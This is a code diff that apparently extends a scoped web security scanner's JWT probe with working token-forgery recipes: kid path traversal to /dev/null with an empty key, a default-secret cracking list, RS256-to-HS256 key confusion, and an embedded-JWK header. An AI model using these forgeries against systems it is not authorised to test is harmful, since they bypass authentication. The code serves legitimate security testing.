@@ -5,7 +5,15 @@ nonce claim to its payload and re-encodes it two ways:
 
 * ``alg_none``: header ``{"alg":"none"}`` and an empty signature;
 * ``bad_signature``: the original header with the original signature, which no
-  longer matches the changed payload.
+  longer matches the changed payload;
+* ``kid_null``: HS256 with ``kid`` pointing at ``/dev/null`` and an empty key;
+* ``weak_secret``: only when an HS256 signature matches a short public list of
+  default secrets, checked offline (no target traffic while guessing);
+* ``rs_hs_confusion``: an RS256 token re-signed as HS256 with the server's own
+  public key from an in-scope JWKS document;
+* ``embedded_jwk``: RS256 signed with a throwaway key generated for this run,
+  whose public half is embedded in the header (``jwk``). A server that trusts
+  the header's key accepts it.
 
 Confirmed only when, on the same observed endpoint:
 
@@ -35,7 +43,17 @@ from .http_observe import _NoRedirect, _cookie_header
 
 MAX_BODY = 256 * 1024
 JWT_RE = re.compile(r"^[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]*$")
-RECIPES = ("alg_none", "bad_signature")
+RECIPES = ("alg_none", "bad_signature", "kid_null", "weak_secret", "rs_hs_confusion",
+           "embedded_jwk")
+# A small, public list of default/demo HMAC secrets. Checked offline against the
+# identity's own token signature; nothing is sent to the target while guessing.
+WEAK_SECRETS = (
+    "secret", "secretkey", "secret_key", "your-256-bit-secret", "your-secret-key",
+    "changeme", "change-me", "password", "123456", "jwt", "jwt_secret", "jwtsecret",
+    "key", "test", "default", "admin", "supersecret", "s3cr3t", "mysecret", "token",
+)
+KID_NULL_PATH = "../../../../../../../../dev/null"
+_JWKS_PATH = re.compile(r"(?i)(?:jwks|/\.well-known/(?:jwks|openid)|/keys/?$|/certs/?$)")
 _VOLATILE = re.compile(rb"[A-Za-z0-9+/=_-]{16,}")
 _DIGITS = re.compile(rb"\d+")
 
@@ -67,7 +85,13 @@ def locate_token(session: dict) -> tuple[str, str, str]:
     raise ValueError("The test identity has no JWT bearer header or cookie")
 
 
-def forge(token: str, recipe: str, nonce: str) -> str:
+def _hmac(key: bytes, signing_input: str) -> str:
+    import hmac
+
+    return _b64encode(hmac.new(key, signing_input.encode(), hashlib.sha256).digest())
+
+
+def _decode(token: str) -> tuple[str, str, str, dict, dict]:
     try:
         header_b64, payload_b64, signature = token.split(".")
         header = json.loads(_b64decode(header_b64))
@@ -76,13 +100,100 @@ def forge(token: str, recipe: str, nonce: str) -> str:
         raise ValueError("The identity token is not a decodable JWT") from exc
     if not isinstance(header, dict) or not isinstance(payload, dict):
         raise ValueError("The identity token is not a JSON object JWT")
+    return header_b64, payload_b64, signature, header, payload
+
+
+def crack_weak_secret(token: str) -> bytes | None:
+    """Offline: return a listed secret that reproduces the token's HS256 signature."""
+    header_b64, payload_b64, signature, header, _ = _decode(token)
+    if str(header.get("alg") or "").upper() != "HS256":
+        return None
+    for candidate in WEAK_SECRETS:
+        if _hmac(candidate.encode(), f"{header_b64}.{payload_b64}") == signature:
+            return candidate.encode()
+    return None
+
+
+def jwk_to_pem(jwks: dict, kid: str | None) -> bytes | None:
+    """Public key PEM for the token's RSA ``kid`` (or the only RSA key)."""
+    from cryptography.hazmat.primitives import serialization
+    from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
+
+    keys = [k for k in (jwks.get("keys") or []) if isinstance(k, dict) and k.get("kty") == "RSA"]
+    chosen = [k for k in keys if kid and k.get("kid") == kid] or (keys if len(keys) == 1 else [])
+    if not chosen:
+        return None
+    key = chosen[0]
+    try:
+        n = int.from_bytes(_b64decode(str(key["n"])), "big")
+        e = int.from_bytes(_b64decode(str(key["e"])), "big")
+    except (KeyError, ValueError):
+        return None
+    public = RSAPublicNumbers(e, n).public_key()
+    return public.public_bytes(serialization.Encoding.PEM,
+                               serialization.PublicFormat.SubjectPublicKeyInfo)
+
+
+def forge(token: str, recipe: str, nonce: str, *, public_pem: bytes | None = None) -> str | None:
+    """Re-encode the identity's token with a nonce claim; ``None`` if not applicable."""
+    header_b64, _payload_b64, signature, header, payload = _decode(token)
     payload = {**payload, "prowl_nonce": nonce}
     body = _b64encode(json.dumps(payload, separators=(",", ":")).encode())
+
+    def header_with(**changes) -> str:
+        return _b64encode(json.dumps({**header, **changes}, separators=(",", ":")).encode())
+
     if recipe == "alg_none":
         return f"{_b64encode(json.dumps({'alg': 'none', 'typ': 'JWT'}).encode())}.{body}."
     if recipe == "bad_signature":
         return f"{header_b64}.{body}.{signature}"
+    if recipe == "kid_null":
+        # A server that reads the HMAC key from a path named by ``kid`` reads
+        # an empty file and verifies a signature made with an empty key.
+        forged_header = header_with(alg="HS256", kid=KID_NULL_PATH)
+        return f"{forged_header}.{body}.{_hmac(b'', f'{forged_header}.{body}')}"
+    if recipe == "weak_secret":
+        secret = crack_weak_secret(token)
+        if secret is None:
+            return None
+        return f"{header_b64}.{body}.{_hmac(secret, f'{header_b64}.{body}')}"
+    if recipe == "rs_hs_confusion":
+        if not public_pem or str(header.get("alg") or "").upper() not in {"RS256", "RS384", "RS512"}:
+            return None
+        forged_header = header_with(alg="HS256")
+        return f"{forged_header}.{body}.{_hmac(public_pem, f'{forged_header}.{body}')}"
+    if recipe == "embedded_jwk":
+        from cryptography.hazmat.primitives import hashes
+        from cryptography.hazmat.primitives.asymmetric import padding, rsa
+
+        throwaway = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+        numbers = throwaway.public_key().public_numbers()
+
+        def b64int(value: int) -> str:
+            return _b64encode(value.to_bytes((value.bit_length() + 7) // 8, "big"))
+
+        jwk = {"kty": "RSA", "kid": f"prowl-{nonce}", "e": b64int(numbers.e), "n": b64int(numbers.n)}
+        forged_header = header_with(alg="RS256", jwk=jwk, kid=jwk["kid"])
+        signing_input = f"{forged_header}.{body}".encode()
+        signed = throwaway.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
+        return f"{forged_header}.{body}.{_b64encode(signed)}"
     raise ValueError("Unsupported JWT recipe")
+
+
+def fetch_jwks(url: str, *, allowed_origin: str) -> dict:
+    """Read a public, in-scope JWKS document (no credentials sent)."""
+    from urllib.parse import urlsplit
+
+    assert_in_scope(url, [allowed_origin])
+    if not _JWKS_PATH.search(urlsplit(url).path or ""):
+        raise ValueError("jwks_url must be a JWKS or OpenID keys endpoint")
+    opener = build_opener(*assessment_urllib_handlers(), _NoRedirect())
+    with opener.open(Request(url, headers={"Accept": "application/json"}, method="GET"),
+                     timeout=20) as response:
+        data = json.loads(response.read(MAX_BODY))
+    if not isinstance(data, dict):
+        raise ValueError("JWKS document is not a JSON object")
+    return data
 
 
 def _request(url: str, *, allowed_origin: str, session: dict, where: str, name: str,
@@ -115,7 +226,8 @@ def _request(url: str, *, allowed_origin: str, session: dict, where: str, name: 
 
 
 def probe_jwt(url: str, *, allowed_origin: str, session: dict, nonce: str,
-              recipes: tuple[str, ...] = RECIPES, send=_request) -> dict:
+              recipes: tuple[str, ...] = RECIPES, send=_request,
+              public_pem: bytes | None = None) -> dict:
     if not nonce or len(nonce) < 8 or len(nonce) > 40 or not nonce.isalnum():
         raise ValueError("A random alphanumeric nonce of at least 8 characters is required")
     where, name, token = locate_token(session)
@@ -134,7 +246,10 @@ def probe_jwt(url: str, *, allowed_origin: str, session: dict, nonce: str,
     probes, hit = [], ""
     if gated:
         for recipe in recipes:
-            row = {"recipe": recipe, **observe(forge(token, recipe, nonce))}
+            forged = forge(token, recipe, nonce, public_pem=public_pem)
+            if forged is None:
+                continue
+            row = {"recipe": recipe, **observe(forged)}
             requests_sent += 1
             row["signal"] = bool(200 <= row["status"] < 300 and row["sha256"] == valid["sha256"])
             probes.append(row)
@@ -148,6 +263,7 @@ def probe_jwt(url: str, *, allowed_origin: str, session: dict, nonce: str,
         "control": {"signal": False, "unauthenticated": unauthenticated, "malformed": malformed,
                     "sha256": unauthenticated["sha256"]},
         "auth_enforced": gated, "probes": probes, "recipe": hit,
+        "public_key_used": bool(public_pem and hit == "rs_hs_confusion"),
         "proof_confirmed": confirmed, "finding": False,
     }
 
